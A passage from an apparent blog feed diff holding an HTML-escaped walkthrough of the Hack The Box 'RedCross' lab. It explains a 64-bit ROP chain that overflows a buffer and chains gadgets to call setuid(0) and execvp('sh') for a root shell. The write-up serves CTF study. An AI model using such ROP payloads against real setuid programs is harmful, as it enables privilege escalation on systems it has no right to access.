class=&quot;o&quot;&gt;(&lt;/span&gt;floppy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,29&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;audio&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,30&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,44&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;video&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,46&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plugdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,108&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;netdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,112&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lpadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,116&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;penelope&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1003&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mailadm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;explaining-the-payload-structure&quot;&gt;Explaining the payload structure&lt;/h2&gt;
+&lt;p&gt;First things to understand is how the calling conventions work for 32-bit and 64-bit architectures.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;execvp&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+NULL
+NULL
+pop rsi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop r15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
+&lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;
+pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
+setuid&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+NULL
+pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
+&lt;span class=&quot;s2&quot;&gt;&quot;allow&quot;&lt;/span&gt; + &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;29
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To better understand, let’s divide the payload into different stack frames.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# stack frame 2&lt;/span&gt;
+execvp&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+NULL
+NULL
+pop rsi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop r15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
+&lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;
+pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
+
+&lt;span class=&quot;c&quot;&gt;# stack frame 1&lt;/span&gt;
+setuid&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+NULL
+pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
+&lt;span class=&quot;s2&quot;&gt;&quot;allow&quot;&lt;/span&gt; + &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;29
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s take a closer look at stack frame 1.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;## higher memory address ##&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Once the &quot;pop rdi&quot; instruction is finished executing, the&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# next instructions is &quot;ret&quot;. Since &quot;setuid()&quot; address is the&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# next value from stack, the flow of execution will now go&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# there completing our command `setuid(0)`.&lt;/span&gt;
+setuid&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# When the &quot;pop rdi&quot; instruction executes, it will pop&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# the next value from the stack into RDI. That next value is&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# NULL which is also equal to &quot;0&quot;.&lt;/span&gt;
+NULL
+
+&lt;span class=&quot;c&quot;&gt;# This contains the address of &quot;pop rdi; ret&quot;. Why do need it?&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# In 64-bit calling convention, to pass a parameter to a&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# function, in this case `setuid()`, we need to put the&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# parameter into RDI. Then once its there, the function will&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# get it in the form of `setuid(0)`.&lt;/span&gt;
+pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
+
+&lt;span class=&quot;c&quot;&gt;# This is the overflow part which will allow us to control the&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# next instruction to execute which is on RIP. The next&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# instruction will be on top of this.&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;allow&quot;&lt;/span&gt; + &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;29
+
+&lt;span class=&quot;c&quot;&gt;## lower memory address ##&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then for stack frame 2.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;## higher memory address ##&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# When &quot;ret&quot; executes, it will go to address of instruction&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# `execvp()` completing our final function call which is&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# `execvp(&quot;sh&quot;, NULL)`&lt;/span&gt;
+execvp&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# When &quot;pop r15&quot; executes, it will put NULL into RSI&lt;/span&gt;
+NULL
+
+&lt;span class=&quot;c&quot;&gt;# When &quot;pop rsi&quot; executes, it will put NULL into RSI&lt;/span&gt;
+NULL
+
+&lt;span class=&quot;c&quot;&gt;# When &quot;ret&quot; instruction executes, it will go to this&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# instruction. Why do we need &quot;pop r15&quot;? Actually we don't&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# need it. It just happened that there is no gadget which&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# consists only of &quot;pop rsi&quot;. So for completenes, we have no&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# choice but to include also &quot;pop r15&quot; in our ROP chain.&lt;/span&gt;
+pop rsi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop r15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
+
+&lt;span class=&quot;c&quot;&gt;# When &quot;pop rdi&quot; instruction executes, it will put &quot;sh&quot; into&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# RDI since this is the next value in the stack.&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Continuing from previous stack frame, the next instruction&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# to execute is &quot;pop rdi; ret&quot;. In this case our target&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# function call is `execvp()`. It accepts 2 parameters:&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#  1. the string we want to execute in this case its&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#     `/bin/sh` or just &quot;sh&quot;. This should be put to RDI.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#  2. a NULL terminator and must be put to RSI.&lt;/span&gt;
+pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
+
+&lt;span class=&quot;c&quot;&gt;## lower memory address ##&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here is also an illustration of stack flow of stack frame 1. Flow for stack frame 2 will be similar.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;## stack view @ RIP &quot;pop_rdi_addr&quot;&lt;/span&gt;
+setuid_addr
+null
+pop_rdi_addr    &lt;span class=&quot;c&quot;&gt;# --&amp;gt; flow executions continues @ this addr&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;## stack view @ pop rdi&lt;/span&gt;
+setuid_addr
+null            &lt;span class=&quot;c&quot;&gt;# --&amp;gt; POP to RDI&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;## stack view @ ret&lt;/span&gt;
+setuid_addr     &lt;span class=&quot;c&quot;&gt;# --&amp;gt; executes `setuid(0)`&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;HTB RedCross&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Padding Oracle Attack</title>
